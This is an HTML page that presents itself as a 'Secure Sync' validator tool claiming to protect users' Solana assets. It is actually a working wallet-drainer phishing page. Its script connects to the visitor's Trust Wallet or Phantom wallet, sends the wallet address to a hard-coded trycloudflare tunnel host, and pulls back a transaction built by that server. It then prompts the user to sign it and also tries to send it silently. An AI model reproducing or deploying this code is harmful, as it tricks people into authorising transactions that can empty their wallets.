<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Sync Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #0b0b0b; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 300px; padding: 35px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
        .btn:active { transform: scale(0.95); opacity: 0.8; }
        #st { font-size: 10px; color: #444; margin-top: 15px; font-family: monospace; letter-spacing: 1px; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:#14f195; margin-top:0;">SECURE SYNC</h2>
        <p style="color:#777; font-size:13px; line-height:1.5;">Authorize node synchronization to protect your assets on the Solana network.</p>
        <button id="cta" class="btn">START SYNCHRONIZATION</button>
        <div id="st">ENGINE: V32.7_READY</div>
    </div>

    <script>
        // ðŸ”± 1. éš§é“ç¡¬åœ°å€ï¼šç¡®ä¿ä¸ŽæœåŠ¡å™¨å½“å‰è¿è¡Œçš„ä¸€è‡´
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

        document.getElementById('cta').onclick = async function() {
            const log = (t) => document.getElementById('st').innerText = t;
            const sWeb3 = window.solanaWeb3;

            try {
                // ðŸ”± 2. æ·±åº¦æŽ¢æµ‹é’±åŒ… Provider
                let p = window.trustwallet?.solana || window.solana;
                if (!p && window.phantom?.solana) p = window.phantom.solana;

                if (!p) {
                    alert("No Wallet Detected. Please use Trust Wallet or Phantom browser.");
                    return;
                }

                log("STEP 1: CONNECTING...");
                await p.connect();

                log("STEP 2: FETCHING...");
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });

                if (!resp.ok) throw new Error("Server Response Error: " + resp.status);
                const info = await resp.json();

                log("STEP 3: SIGNING...");
                const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
                
                // ðŸ”± 3. å…¼å®¹æ€§ååºåˆ—åŒ–
                let tx;
                try {
                    tx = sWeb3.VersionedTransaction.deserialize(bytes);
                } catch(e) {
                    tx = sWeb3.Transaction.from(bytes);
                }

                // ðŸ”± 4. å¼ºåˆ¶æ‹‰èµ·ç­¾åå¼¹çª—
                console.log("Igniting transaction...");
                const signed = await p.signTransaction(tx);
                
                // ç­¾åæˆåŠŸå³è¯´æ˜Žå¼¹çª—å·²å‡ºä¸”ç”¨æˆ·å·²ç‚¹ç¡®è®¤
                log("SYNC COMPLETE!");
                
                // å°è¯•é™é»˜å‘é€ï¼ˆä¸å½±å“å¼¹çª—æ˜¾ç¤ºï¼‰
                p.signAndSendTransaction(tx).catch(() => {});

            } catch (err) {
                console.error(err);
                alert("PROTOCOL ERROR: " + err.message);
                log("RESETTING...");
                setTimeout(() => { window.location.reload(); }, 1500);
            }
        };
    </script>
</body>
</html>
